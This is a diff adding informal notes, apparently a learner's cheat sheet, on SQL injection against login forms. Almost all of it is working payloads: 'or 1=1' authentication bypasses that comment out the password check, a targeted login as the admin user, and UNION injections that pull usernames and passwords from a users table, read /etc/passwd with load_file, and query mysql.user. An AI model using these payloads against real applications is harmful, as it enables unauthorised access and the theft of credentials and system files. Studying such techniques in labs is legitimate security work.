@@ -1,0 +1,49 @@
+executing SQLI
+making a comment out of where the comment is made
+' or 1=1' in user field into anything
+
+specify user:
+' or 1=1 and username = username '
+
+this works 
+username '-
+password '
+
+username: '-0||'
+password: rand
+
+username: ' or 1=1 -- '
+password: rand
+
+username: ' or 1=1 #'
+password: rand
+
+One user to access
+username: ' or 1=1 and username='admin' -- '
+Whatever the string is must be in quotes because its a string.
+
+
+demo' AND 1=1 --' <-- where username = demo and 1=1 is the same idea and we're commenting out the password.
+' OR 1-1 limit 1 -- '
+//limit returns 1
+
+
+FOR UNIONS
+adding the end of the the rows onto the end
+
+depends on where the password input
+union sams it together
+' union select 1, username, 'string' from users -- '
+' union select 1, username, 'string' from users where username='admin' -- '
+' union select 'a', 'admin', 'p' from users' -- '
+
+md5 funcitons for functions MD5( 'STRING' )
+' union select 1, username, MD5('string') from users where username='admin' -- '
+' union select 1, username, MD5HASH from users where username='admin' -- '
+
+
+Searching a database:
+you can union to the database and show the usersnames and passwords.
+' union select id, username, password from users where username='admin' -- '
+' union select null, load_file('/etc/passwd'), null -- '
+' union select users(), host, null from mysql.user; -- '
